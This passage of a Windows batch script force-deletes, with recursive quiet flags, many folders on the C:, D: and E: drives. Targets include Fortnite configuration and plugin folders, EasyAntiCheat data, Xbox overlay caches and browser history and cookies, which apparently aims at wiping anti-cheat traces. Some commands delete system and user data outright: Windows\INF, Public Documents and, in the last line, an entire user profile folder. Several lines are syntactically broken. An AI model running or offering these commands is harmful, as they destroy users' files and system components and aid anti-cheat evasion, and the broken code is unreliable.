del /f /s /q C:\ProgramData\Microsoft\DataMart\PaidWiFi\NetworksCache
del /f /s /q C:\ProgramData\Microsoft\DataMart\PaidWiFi\Rules
rmdir /s /q C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Windows\DeliveryOptimization\Cache
rmdir /s /q C:\Users\%username%\AppData\Local\Temp
rmdir /s /q C:\Users\%username%\AppData\Local\Microsoft\Windows\INetCache
rmdir /s /q C:\Users\%username%\AppData\Local\Microsoft\Windows\INetCookies
rmdir /s /q C:\Users\%username%\AppData\Local\Microsoft\Windows\History
rmdir /s /q C:\Users\%username%\Intel
rmdir /s /q C:\Windows\System32\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData
rmdir /s /q \"C:\Users\%username%\AppData\Local\Microsoft\Feeds Cache
rmdir /s /q D:\Users\%username%\AppData\Roaming\Microsoft\Windows\CloudStore
rmdir /s /q D:\Users\%username%\AppData\Local\FortniteGame\Saved
rmdir /s /q D:\Windows\INF
rmdir /s /q D:\ProgramData\%username%\Microsoft\XboxLive\NSALCache
rmdir /s /q D:\Users\Public\Documents
rmdir /s /q D:\Windows\Prefetch
rmdir /s /q D:\Users\%username%\AppData\Local\D3DSCache
rmdir /s /q D:\Users\%username%\AppData\Local\CrashReportClient
rmdir /s /q D:\Windows\temp
rmdir /s /q D:\Users\%username%\AppData\Local\Microsoft\Windows\SettingSync\metastore
rmdir /s /q D:\Windows\SoftwareDistribution\DataStore\Logs
rmdir /s /q D:\ProgramData\Microsoft\Windows\WER\Temp
rmdir /s /q D:\Users\%username%\AppData\Local\AMD\DxCache
rmdir /s /q \"D:\Users\%username%\AppData\Local\NVIDIA Corporation
@del /s /f /a:h / a : a / q D:\Users\username%\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\*.*
@del /s /f /a:h / a : a / q D:\Users\%username%\AppData\Local\Microsoft\Windows\WebCache\*.*
rmdir /s /q D:\Users\%username%\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\AC
rmdir /s /q D:\Users\%username%\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\LocalCache
rmdir /s /q D:\Users\%username%\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\Settings
rmdir /s /q \"D:\Program Files\Epic Games\Fortnite\Engine\Plugins
rmdir /s /q \"D:\Program Files\Epic Games\Fortnite\FortniteGame\Plugins
rmdir /s /q \"D:\Program Files\Epic Games\Fortnite\FortniteGame\PersistentDownloadDir
rmdir /s /q \"D:\Program Files\Epic Games\Fortnite\FortniteGame\Config
rmdir /s /q D:\Users\%username%\AppData\Roaming\EasyAntiCheat
del /f /s /q D:\ProgramData\Microsoft\DataMart\PaidWiFi\NetworksCache
del /f /s /q D:\ProgramData\Microsoft\DataMart\PaidWiFi\Rules
rmdir /s /q D:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Windows\DeliveryOptimization\Cache
rmdir /s /q D:\Users\%username%\AppData\Local\Temp
rmdir /s /q D:\Users\%username%\AppData\Local\Microsoft\Windows\INetCache
rmdir /s /q D:\Users\%username%\AppData\Local\Microsoft\Windows\INetCookies
rmdir /s /q D:\Users\%username%\AppData\Local\Microsoft\Windows\History
rmdir /s /q D:\Users\%username%\Intel
rmdir /s /q D:\Windows\System32\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData
rmdir /s /q \"D:\Users\%username%\AppData\Local\Microsoft\Feeds Cache
rmdir /s /q E:\Users\%username%\AppData\Roaming\Microsoft\Windows\CloudStore
rmdir /s /q E:\Users\%username%\AppData\Local\FortniteGame\Saved
rmdir /s /q E:\Windows\INF
rmdir /s /q E:\ProgramData\%username%\Microsoft\XboxLive\NSALCache
rmdir /s /q E:\Users\Public\Documents
rmdir /s /q E:\Windows\Prefetch
rmdir /s /q E:\Users\%username%\AppData\Local\D3DSCache
rmdir /s /q E:\Users\%username%\AppData\Local\CrashReportClient
rmdir /s /q E:\Users\%username%\AppData\Local\Microsoft\Windows\SettingSync\metastore
rmdir /s /q E:\Windows\SoftwareDistribution\DataStore\Logs
rmdir /s /q E:\ProgramData\Microsoft\Windows\WER\Temp
rmdir /s /q E:\Users\%username%\AppData\Local\AMD\DxCache
rmdir /s /q \"E:\Users\%username%\AppData\Local\NVIDIA Corporation
@del /s /f /a:h / a : a / q E:\Users\username%\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\*.*
@del /s /f /a:h / a : a / q E:\Users\%username%\AppData\Local\Microsoft\Windows\WebCache\*.*
rmdir /s /q E:\Users\%username%\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\AC
rmdir /s /q E:\Users\%username%\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\LocalCache
rmdir /s /q E:\Users\%username%\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\Settings
rmdir /s /q \"E:\Program Files\Epic Games\Fortnite\Engine\Plugins
rmdir /s /q \"E:\Program Files\Epic Games\Fortnite\FortniteGame\Plugins
rmdir /s /q \"E:\Program Files\Epic Games\Fortnite\FortniteGame\PersistentDownloadDir
rmdir /s /q \"E:\Program Files\Epic Games\Fortnite\FortniteGame\Config
rmdir /s /q E:\Users\%username%\AppData\Roaming\EasyAntiCheat
del /f /s /q E:\ProgramData\Microsoft\DataMart\PaidWiFi\NetworksCache
del /f /s /q E:\ProgramData\Microsoft\DataMart\PaidWiFi\Rules
rmdir /s /q E:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Windows\DeliveryOptimization\Cache
rmdir /s /q E:\Users\%username%\AppData\Local\Temp
rmdir /s /q E:\Users\%username%\